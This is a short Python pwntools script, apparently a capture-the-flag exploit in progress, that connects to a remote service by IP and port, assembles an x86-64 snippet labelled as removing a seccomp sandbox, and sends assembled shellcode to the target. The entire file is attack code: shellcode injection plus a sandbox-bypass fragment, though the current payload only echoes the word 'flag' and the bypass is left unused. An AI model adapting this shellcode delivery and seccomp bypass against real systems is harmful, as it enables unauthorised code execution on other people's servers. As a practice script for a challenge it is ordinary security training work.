import pwn 

conn = pwn.connect('3.71.110.92', 30300)

pwn.context.update(os='linux', arch='amd64')

rm_seccomp = pwn.asm("""mov rax, qword [rbp-0x98]
mov rax, qword [rax]
mov rdi, rax
jmp 0x1090
""")

payload = pwn.asm(pwn.shellcraft.echo('flag'))
# print(rm_seccomp)
# print(payload)
# print(len(payload))

print(conn.recvuntil(b'...').decode())

conn.sendline(payload)

conn.recv()
conn.recv()


conn.close()